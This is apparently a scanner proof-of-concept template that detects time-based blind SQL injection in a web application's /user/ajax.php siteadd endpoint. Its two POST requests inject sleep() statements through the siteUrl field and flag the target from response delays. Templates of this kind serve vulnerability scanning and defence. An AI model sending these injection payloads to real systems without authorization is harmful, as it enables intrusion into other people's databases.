name: poc-yaml-wxgongzhonghuidiao-user_ajax-sql
transport: http


rules:
  r0:
    request:
      method: POST
      path: /user/ajax.php?act=siteadd
      headers:
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
        Content-Type: application/x-www-form-urlencoded
      body: siteUrl=';select sleep(6)#'
    expression: response.latency >= 6000 && response.latency <= 7000
  r1:
    request:
      method: POST
      path: /user/ajax.php?act=siteadd
      headers:
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
        Content-Type: application/x-www-form-urlencoded
      body: siteUrl=';select sleep(10)#'
    expression: response.latency >= 10000 && response.latency <= 11000
expression: r0() && r1()


detail:
  author: Superhero
  links:
